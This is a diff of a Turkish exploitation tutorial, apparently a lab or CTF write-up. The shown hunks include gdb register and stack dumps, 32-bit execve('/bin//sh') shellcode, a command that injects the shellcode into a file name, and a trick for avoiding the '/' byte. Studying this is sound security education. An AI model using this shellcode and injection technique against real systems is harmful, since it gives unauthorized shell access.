@@ -116,7 +116,7 @@ r `pwd`
 
 İlk breakpoint'ten **run** fonksiyonuna kadar **eax**'in değerlerine bakalım.
 
-```
+```asm
 (gdb) i r eax
 eax            0x804a054	134520916
 (gdb) x/s $eax
@@ -134,7 +134,7 @@ eax            0x804a054	134520916
 
 Görüldüğü üzere öncelikle "sh_"'ın, sonrasında da "sh_"'ın 3 karakter sağının adresi **eax**'e atılıyor. Artık **run** fonksiyonuna verilen parametreyi bildiğimize göre devam edelim.
 
-```
+```asm
 (gdb) x/8wx $esp
 0xffffd590:	0xffffd598	0xffffd5a8	0x0804a062	0x0804a062
 0xffffd5a0:	0x0804a054	0x0804a008	0x00000000	0xf7e2a286
@@ -155,9 +155,10 @@ O zaman biz de bu dosyanın ismine 3. karakterden itibaren **shellcode** koyup *
 
 Çok beğenerek okuduğum "Hacking the art of exploitation" kitabından alıntılayarak shellcode'umuzu anlatacağım.
 
-```
+```asm
 BITS 32
 
+;execve(const char *filename, char *const argv[], char *const envp[]);
 xor eax, eax     ; eax'i sıfır yap
 push eax         ; stack'e stringi sonlandırmak için \0 at
 push 0x68732f2f  ; stack'e "//sh" at
@@ -184,9 +185,9 @@ touch sh_`cat nasm.out`
 touch: cannot touch 'sh_1'$'\300''Ph//shh/bin'$'\211\343''P'$'\211\342''S'$'\211\341\260\v''̀': No such file or directory
 ```
 
-Çıktıda görebiliriz ki "/" karakteri var ve bunun bir dosya ismi değil de dosya yolu olduğunu zannettiğinden sistem dosya bulunamadı hatası veriliyor. Linux sistemlerinde dosya adı "/" içeremiyor.
+Bu hatayı almamızın sebebi shellcode'umuzun içerisinde "/" karakteri olması. Bu karakter, bir dosya isminde bulunamaz. Yani öyle bir shellcode yazmalıyız ki, içerisinde "/", yani 16'lık tabanda "2f" bulunmasın.
 
-Bunu çok basit bir yöntemle atlatabiliriz. Düşünürsek derlenmiş kodumuzun "/" karakterini barındırmasının sebebi **push 0x68732f2f** ve **push 0x6e69622f** satırları. Biz **2f**'i şu şekilde yazıyla belirtmeden de stack'e koyabiliriz.
+Bunu çok basit bir yöntemle halledebiliriz. Derlenmiş kodumuzun "/" karakterini barındırmasının sebebi **push 0x68732f2f** ve **push 0x6e69622f** satırları. Biz **2f**'i şu şekilde yazıyla belirtmeden de stack'e koyabiliriz:
 
 ```
 mov eax, 0x57621e1e
